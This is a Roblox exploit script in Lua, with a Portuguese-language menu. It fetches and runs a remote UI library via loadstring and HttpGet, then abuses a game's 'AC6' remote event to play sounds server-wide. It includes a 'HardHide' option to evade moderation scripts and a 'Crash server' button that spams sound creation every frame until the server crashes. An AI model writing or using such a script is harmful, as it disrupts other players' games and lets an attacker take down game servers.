local Material = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/MaterialLua/master/Module.lua"))();

local CoreGui = game:GetService('CoreGui');
local SoundService = game:GetService('SoundService');
local HttpService = game:GetService('HttpService');
local StarterGui = game:GetService('StarterGui');
local RunService = game:GetService('RunService');

local UI = Material.Load({
    Title = 'AC6',
    Style = 3,
    SizeX = 300,
    SizeY = 350,
    Theme = 'Dark'
})

local Page = UI.New({
    Title = 'Main'
})

local Configuration = UI.New({ Title = 'Config' })

local CurrentSoundsDD;

getgenv().Loop = false;
getgenv().Volume = 1;
getgenv().Id = 6864303374;
getgenv().RandomName = false;
getgenv().Name = 'robloxutils.exe';
getgenv().Parent = SoundService;
getgenv().CurrentSounds = {};
getgenv().HardHide = false;

local function GetRemote()
    for i,v in next, workspace:GetDescendants() do
        if v:IsA('RemoteEvent') and string.find(v.Name:lower(), 'ac6') then
            return v
        end
    end
    return false
end

local function CreateSound()
    local Remote = GetRemote();

    local SoundName = getgenv().RandomName and HttpService:GenerateGUID(false) or getgenv().Name;
    local SoundId = getgenv().Id;
    local Parent =  getgenv().HardHide and StarterGui or getgenv().Parent;
    local Volume = getgenv().Volume;
    local Loop = getgenv().Loop;

    Remote:FireServer('newSound', SoundName, Parent, 'rbxassetid://'..SoundId, Volume, 1, Loop)
    Remote:FireServer('updateSound', SoundName, 'rbxassetid://'..SoundId, 1, Volume)
    Remote:FireServer('playSound', SoundName)
end

Configuration.Toggle({
    Text = 'Loop',
    Callback = function(Status)
        getgenv().Loop = Status
    end,
    Enabled = getgenv().Loop
})

Configuration.Toggle({
    Text = 'Nome do som randômico',
    Callback = function(Status)
        getgenv().RandomName = Status;
    end,
    Enabled = getgenv().RandomName,
    Menu = {
        Info = function()
            UI.Banner({Text = 'Geralmente o AC6 deleta os sons antigos se estiver com mesmo nome, ativando essa opção fará que o som tenha nomes diferentes e você consiga usar mais de um som ao mesmo tempo.'})
        end
    }
})

Configuration.Toggle({
    Text = 'HardHide',
    Callback = function(Status)
        getgenv().HardHide = Status;
    end,
    Enabled = getgenv().HardHide;
    Menu = {
        Info = function()
            UI.Banner({Text = 'Alguns jogos como RPs free models costumam usar scripts executados no adonis (xd) tirando os sons de lugares que são comuns outros scripts usarem, como Workspace e SoundService. Ativando essa opção os sons criados irá se esconder em um Parent que a maioria não sabe onde fica.'})
        end,
    }
})

Page.TextField({
    Text = 'Id',
    Callback = function(Id)
        Id = tonumber(Id);
        if Id == nil then
            return UI.Banner({Text = 'Id precisa ser um número'})
        end

        getgenv().Id = Id;
    end,
})

Page.TextField({
    Text = 'Volume',
    Callback = function(Volume)
        Volume = tonumber(Volume);
        if Volume == nil then
            return UI.Banner({Text = 'Volume precisa ser um número'})
        end
        if Volume > 10 or Volume < 0 then
            return UI.Banner({Text = 'Volume precisa estar entre 0 e 10, sendo os limites estabelecidos pela ROBLOX'})
        end

        getgenv().Volume = Volume;
    end,
})

Page.Button({
    Text = 'Play',
    Callback = function()
        CreateSound()
    end,
})

Page.Button({
    Text = 'Crash server',
    Callback = function()
        local SoundId = 7158486381;
        local Remote = GetRemote();
        local Parent = SoundService;
        local Volume = 10;
        local Loop = true;

        RunService.Stepped:Connect(function()
            local SoundName = HttpService:GenerateGUID(false);
            Remote:FireServer('newSound', SoundName, Parent, 'rbxassetid://'..SoundId, Volume, 0.1, Loop)
            Remote:FireServer('playSound', SoundName)
        end)
    end,
    Menu = {
        Info = function()
            UI.Banner({Text = 'Spamma de som o servidor até crashar. O tempo de crash depende do seu FPS, +alto = mais rapido'})
        end
    }
})
